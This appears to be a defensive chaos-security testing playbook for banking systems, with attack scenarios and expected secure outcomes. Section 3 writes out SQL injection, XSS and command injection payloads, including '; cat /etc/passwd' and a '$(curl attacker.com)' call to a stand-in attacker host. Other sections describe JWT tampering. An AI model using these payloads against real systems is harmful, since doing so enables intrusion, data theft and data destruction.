# Chaos Security Testing Playbook for Banking Systems

## Overview

This playbook defines chaos security test scenarios for banking applications. Each test simulates real-world attack patterns and verifies that security controls respond correctly under adversarial conditions.

---

## 1. Authentication Chaos Tests

### 1.1 JWT Token Manipulation

- **Objective**: Verify the system rejects tampered, expired, and malformed JWT tokens.
- **Setup**: Obtain a valid JWT token via normal authentication flow.
- **Execution Steps**:
  1. Modify the payload (change `sub` claim to another user ID) and re-sign with a random key
  2. Submit the tampered token to a protected endpoint
  3. Send an expired token (modify `exp` to past timestamp)
  4. Send a token with `alg: none` header
  5. Send a token signed with HMAC using the RSA public key (algorithm confusion attack)
- **Expected Result**: All requests return 401 Unauthorized. No data from other accounts is exposed.
- **Severity if Fails**: Critical

### 1.2 Session Fixation

- **Objective**: Verify that session IDs are regenerated after authentication.
- **Setup**: Start an unauthenticated session and capture the session identifier.
- **Execution Steps**:
  1. Record the pre-authentication session/token ID
  2. Complete a successful login
  3. Compare the post-authentication session/token ID
  4. Attempt to use the pre-authentication identifier
- **Expected Result**: Session ID changes after login. Old session ID is invalid.
- **Severity if Fails**: High

### 1.3 Brute Force Protection

- **Objective**: Verify account lockout and rate limiting on authentication endpoints.
- **Setup**: Create a test account with known credentials.
- **Execution Steps**:
  1. Send 5 consecutive failed login attempts with wrong passwords
  2. Attempt login with correct credentials on the 6th attempt
  3. Wait for lockout cooldown period (30 minutes)
  4. Verify login works after cooldown
  5. Verify rate limiting headers are present in responses
- **Expected Result**: Account locks after 5 failures. Correct credentials rejected during lockout. Account recovers after cooldown.
- **Severity if Fails**: High

---

## 2. Authorization Chaos Tests

### 2.1 Insecure Direct Object Reference (IDOR)

- **Objective**: Verify users cannot access resources belonging to other users by manipulating IDs.
- **Setup**: Create two test users (User A and User B) each with their own accounts and transactions.
- **Execution Steps**:
  1. Authenticate as User A
  2. Request User B's account details by substituting account ID in the URL
  3. Attempt to list User B's transactions
  4. Attempt to initiate a transfer from User B's account
  5. Try sequential ID enumeration on account endpoints
- **Expected Result**: All cross-user access attempts return 403 Forbidden. No data leakage in error responses.
- **Severity if Fails**: Critical

### 2.2 Privilege Escalation

- **Objective**: Verify that standard users cannot access admin or elevated functions.
- **Setup**: Authenticate as a standard customer user (no admin role).
- **Execution Steps**:
  1. Attempt to access admin API endpoints (/admin/*, /internal/*)
  2. Modify JWT claims to add admin role and resubmit
  3. Attempt to approve your own high-value transfer (dual-control bypass)
  4. Call user management APIs (create/delete user)
  5. Attempt to modify transfer limits
- **Expected Result**: All escalation attempts return 403 Forbidden. JWT tampering returns 401.
- **Severity if Fails**: Critical

### 2.3 Horizontal Access Control

- **Objective**: Verify that users at the same privilege level cannot access each other's data.
- **Setup**: Create multiple customer accounts at the same authorization level.
- **Execution Steps**:
  1. Authenticate as Customer A
  2. Enumerate endpoints that accept resource IDs (account, transaction, beneficiary)
  3. Replace resource IDs with those belonging to Customer B
  4. Test batch/bulk endpoints with mixed ownership IDs
  5. Test search/filter endpoints for cross-customer data leakage
- **Expected Result**: Only own resources are accessible. Mixed batches are fully rejected.
- **Severity if Fails**: Critical

---

## 3. Input Chaos Tests

### 3.1 SQL Injection Payloads

- **Objective**: Verify all input fields are immune to SQL injection.
- **Setup**: Identify all endpoints accepting user input (forms, query parameters, headers).
- **Execution Steps**:
  1. Submit `' OR '1'='1' --` in login username field
  2. Submit `'; DROP TABLE accounts; --` in search fields
  3. Submit `1 UNION SELECT * FROM users --` in ID parameters
  4. Test time-based blind injection: `' AND SLEEP(5) --`
  5. Test all numeric fields with `1; SELECT pg_sleep(5)`
- **Expected Result**: No SQL errors exposed. No timing differences. All inputs sanitized.
- **Severity if Fails**: Critical

### 3.2 XSS Vectors

- **Objective**: Verify output encoding prevents cross-site scripting.
- **Setup**: Identify all fields that reflect user input (beneficiary names, transaction descriptions).
- **Execution Steps**:
  1. Store `<script>alert('XSS')</script>` as a beneficiary name
  2. Submit `"><img src=x onerror=alert(1)>` in description fields
  3. Test SVG-based XSS: `<svg onload=alert(1)>`
  4. Test event handler injection in all text inputs
  5. Verify Content-Security-Policy headers are enforced
- **Expected Result**: All scripts are encoded in output. CSP blocks inline execution. No alert fires.
- **Severity if Fails**: High

### 3.3 Command Injection

- **Objective**: Verify no user input reaches system command execution.
- **Setup**: Identify endpoints that may process files or generate reports.
- **Execution Steps**:
  1. Submit `; cat /etc/passwd` in filename parameters
  2. Submit `| whoami` in text processing fields
  3. Submit `$(curl attacker.com)` in any free-text input
  4. Test backtick execution: `` `id` `` in all inputs
  5. Test parameter pollution with duplicate parameters containing commands
- **Expected Result**: No command execution. Inputs treated as literal strings.
- **Severity if Fails**: Critical

---

## 4. Data Exposure Tests

### 4.1 Error Response Information Leakage

- **Objective**: Verify error responses do not expose internal system details.
- **Setup**: Trigger various error conditions across all endpoints.
- **Execution Steps**:
  1. Send malformed JSON to trigger parsing errors
  2. Request non-existent resources to trigger 404 handling
  3. Trigger server errors with oversized payloads
  4. Force database errors with invalid query parameters
  5. Check all error responses for stack traces, SQL fragments, or internal IPs
- **Expected Result**: Generic error messages only. No stack traces, no internal paths, no technology disclosure.
- **Severity if Fails**: Medium

### 4.2 PII in Logs

- **Objective**: Verify that personally identifiable information is never written to application logs.
- **Setup**: Perform normal banking operations that involve PII (account creation, transfer, profile update).
- **Execution Steps**:
  1. Create a transfer with full account details
  2. Search application logs for the full account number
  3. Search logs for customer NRIC/ID number
  4. Search logs for passwords or OTP values
  5. Verify log masking: only last 4 digits of account numbers should appear
- **Expected Result**: No full PII in logs. Account numbers masked to last 4 digits. No passwords/OTPs logged.
- **Severity if Fails**: High

### 4.3 Debug Endpoints

- **Objective**: Verify no debug or diagnostic endpoints are accessible in production.
- **Setup**: Deploy the application in production-equivalent configuration.
- **Execution Steps**:
  1. Probe for common debug endpoints: /debug, /actuator, /health/full, /env, /trace
  2. Check for Spring Boot Actuator endpoints exposure
  3. Probe for /swagger-ui, /api-docs without authentication
  4. Check response headers for technology disclosure (X-Powered-By, Server version)
  5. Verify CORS configuration does not allow wildcard origins
- **Expected Result**: Debug endpoints return 404 or require authentication. No technology headers exposed.
- **Severity if Fails**: Medium

---

## 5. Resilience Tests

### 5.1 Circuit Breaker Verification

- **Objective**: Verify circuit breakers open when downstream services fail and recover correctly.
- **Setup**: Configure a mock downstream service (Core Banking) that can simulate failures.
- **Execution Steps**:
  1. Send requests while downstream is healthy (verify normal operation)
  2. Make downstream return 500 errors for 10 consecutive requests
  3. Verify circuit breaker opens (requests fail-fast without reaching downstream)
  4. Wait for half-open interval and send one request
  5. Restore downstream and verify circuit closes after successful probe
- **Expected Result**: Circuit opens after failure threshold. Fail-fast responses within 100ms. Automatic recovery after probe succeeds.
- **Severity if Fails**: High

### 5.2 Timeout Handling

- **Objective**: Verify the system handles slow downstream responses without resource exhaustion.
- **Setup**: Configure downstream service to introduce delays (5s, 30s, 60s).
- **Execution Steps**:
  1. Set downstream latency to 5 seconds (within timeout)
  2. Set downstream latency to 60 seconds (beyond timeout)
  3. Verify timeout response is returned to client within acceptable time
  4. Send 100 concurrent requests to a slow downstream
  5. Verify thread pool is not exhausted (new requests still accepted)
- **Expected Result**: Timeouts fire at configured threshold (30s). No thread pool exhaustion. Graceful error responses.
- **Severity if Fails**: High

### 5.3 Rate Limiting

- **Objective**: Verify rate limits protect against abuse while allowing legitimate traffic.
- **Setup**: Configure known rate limits for test account.
- **Execution Steps**:
  1. Send requests at the exact rate limit threshold
  2. Exceed the rate limit by 2x and verify rejection (429 Too Many Requests)
  3. Verify rate limit headers in responses (X-RateLimit-Remaining, X-RateLimit-Reset)
  4. Verify rate limits are per-user (User B unaffected by User A's exhaustion)
  5. Wait for rate limit window reset and verify access is restored
- **Expected Result**: Requests rejected with 429 after limit exceeded. Per-user isolation confirmed. Automatic recovery after window reset.
- **Severity if Fails**: High
